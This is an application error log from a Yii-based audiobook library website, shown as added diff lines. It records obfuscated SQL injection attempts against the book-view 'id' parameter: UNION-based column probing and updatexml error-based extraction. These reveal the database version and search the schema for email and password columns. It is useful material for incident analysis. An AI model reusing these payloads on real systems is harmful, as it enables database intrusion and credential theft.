+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39%2c0x39363135373834333033332e39
+---
+2023/08/01 12:19:21 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39%2c0x39363135373834333033332e39%2c0x39363135373834333033342e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39%2c0x39363135373834333033332e39%2c0x39363135373834333033342e39
+---
+2023/08/01 12:19:24 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39%2c0x39363135373834333033332e39%2c0x39363135373834333033342e39%2c0x39363135373834333033352e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39%2c0x39363135373834333032362e39%2c0x39363135373834333032372e39%2c0x39363135373834333032382e39%2c0x39363135373834333032392e39%2c0x39363135373834333033302e39%2c0x39363135373834333033312e39%2c0x39363135373834333033322e39%2c0x39363135373834333033332e39%2c0x39363135373834333033342e39%2c0x39363135373834333033352e39
+---
+2023/08/02 09:21:50 [error] [system.db.CDbCommand] CDbCommand::fetchAll() failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.6.16-cll-lve~'. The SQL statement executed was: SELECT AUTOR as autor FROM libros INNER JOIN autor_escribe_libros ON libros.ID_LIBRO = autor_escribe_libros.ID_LIBRO INNER JOIN autores ON autores.ID_AUTOR = autor_escribe_libros.ID_AUTOR where autor_escribe_libros.ID_LIBRO =updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0).
+in /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php (530)
+in /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php (55)
+in /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php (13)
+2023/08/02 09:21:50 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.6.16-cll-lve~'. The SQL statement executed was: SELECT AUTOR as autor FROM libros INNER JOIN autor_escribe_libros ON libros.ID_LIBRO = autor_escribe_libros.ID_LIBRO INNER JOIN autores ON autores.ID_AUTOR = autor_escribe_libros.ID_AUTOR where autor_escribe_libros.ID_LIBRO =updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/db/CDbCommand.php(396): CDbCommand->queryInternal('fetchAll', Array, Array)
+#1 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php(530): CDbCommand->queryAll()
+#2 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php(55): LibrosController->libroAutor('updatexml(rand(...')
+#3 [internal function]: LibrosController->actionView('updatexml(rand(...')
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/actions/CAction.php(108): ReflectionMethod->invokeArgs(Object(LibrosController), Array)
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/actions/CInlineAction.php(47): CAction->runWithParamsInternal(Object(LibrosController), Object(ReflectionMethod), Array)
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#11 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#12 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#13 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#14 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#15 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#16 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#17 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#18 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=updatexml(rand()%2c(%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fuNhEx(%2f**%2f%2f**%2fhEx(%2f**%2f%2f**%2fcOnCaT(0x7e%2cversion()%2c0x7e))))%2c0)
+---
+2023/08/02 09:21:55 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=updatexml(rand()%2c(%2f**%2f%2f**%2fsElEcT+(%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fuNhEx(%2f**%2f%2f**%2fhEx(%2f**%2f%2f**%2fcOnCaT(0x7e%2ccount(*)%2c0x7e)))+%2f**%2f%2f**%2ffRoM+information_schema.%2f**%2f%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2f%2f**%2ftAbLeS+as+t+on+t.table_schema%3dd.%2f**%2f%2f**%2fsChEmA_nAmE+join+information_schema.%2f**%2f%2f**%2fcOlUmNs+as+c+on+c.table_schema%3dd.%2f**%2f%2f**%2fsChEmA_nAmE+and+c.table_name%3dt.tAblE_nAmE+%2f**%2f%2f**%2fwHeRe+not+c.%2f**%2f%2f**%2ftAbLe_ScHeMa+in+(0x696e666f726d6174696f6e5f736368656d61%2c0x6d7973716c)+and+lower(c.%2f**%2f%2f**%2fcOlUmN_nAmE)+like+0x25656d61696c25))%2c0)
+---
+2023/08/02 09:22:01 [error] [system.db.CDbCommand] CDbCommand::fetchAll() failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.6.16-cll-lve~'. The SQL statement executed was: SELECT AUTOR as autor FROM libros INNER JOIN autor_escribe_libros ON libros.ID_LIBRO = autor_escribe_libros.ID_LIBRO INNER JOIN autores ON autores.ID_AUTOR = autor_escribe_libros.ID_AUTOR where autor_escribe_libros.ID_LIBRO =updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0).
+in /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php (530)
+in /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php (55)
+in /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php (13)
+2023/08/02 09:22:01 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.6.16-cll-lve~'. The SQL statement executed was: SELECT AUTOR as autor FROM libros INNER JOIN autor_escribe_libros ON libros.ID_LIBRO = autor_escribe_libros.ID_LIBRO INNER JOIN autores ON autores.ID_AUTOR = autor_escribe_libros.ID_AUTOR where autor_escribe_libros.ID_LIBRO =updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/db/CDbCommand.php(396): CDbCommand->queryInternal('fetchAll', Array, Array)
+#1 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php(530): CDbCommand->queryAll()
+#2 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/protected/controllers/LibrosController.php(55): LibrosController->libroAutor('updatexml(rand(...')
+#3 [internal function]: LibrosController->actionView('updatexml(rand(...')
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/actions/CAction.php(108): ReflectionMethod->invokeArgs(Object(LibrosController), Array)
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/actions/CInlineAction.php(47): CAction->runWithParamsInternal(Object(LibrosController), Object(ReflectionMethod), Array)
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#11 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#12 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#13 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#14 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#15 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#16 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#17 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#18 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=updatexml(rand()%2c(%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fuNhEx(%2f**%2f%2f**%2fhEx(%2f**%2f%2f**%2fcOnCaT(0x7e%2cversion()%2c0x7e))))%2c0)
+---
+2023/08/02 09:22:07 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=updatexml(rand()%2c(%2f**%2f%2f**%2fsElEcT+(%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fuNhEx(%2f**%2f%2f**%2fhEx(%2f**%2f%2f**%2fcOnCaT(0x7e%2ccount(*)%2c0x7e)))+%2f**%2f%2f**%2ffRoM+information_schema.%2f**%2f%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2f%2f**%2ftAbLeS+as+t+on+t.table_schema%3dd.%2f**%2f%2f**%2fsChEmA_nAmE+join+information_schema.%2f**%2f%2f**%2fcOlUmNs+as+c+on+c.table_schema%3dd.%2f**%2f%2f**%2fsChEmA_nAmE+and+c.table_name%3dt.tAblE_nAmE+%2f**%2f%2f**%2fwHeRe+not+c.%2f**%2f%2f**%2ftAbLe_ScHeMa+in+(0x696e666f726d6174696f6e5f736368656d61%2c0x6d7973716c)+and+lower(c.%2f**%2f%2f**%2fcOlUmN_nAmE)+like+0x2570617373776f726425))%2c0)
+---
+2023/09/04 15:54:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "buscadorlibros/biblioteca".' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php:286
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('buscadorlibros/...')
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#2 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/comparlante/index.php?r=buscadorlibros/biblioteca
+---
+2023/09/23 15:26:55 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "buscadorlibros/biblioteca".' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php:286
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('buscadorlibros/...')
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#2 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/comparlante/index.php?r=buscadorlibros/biblioteca
+---
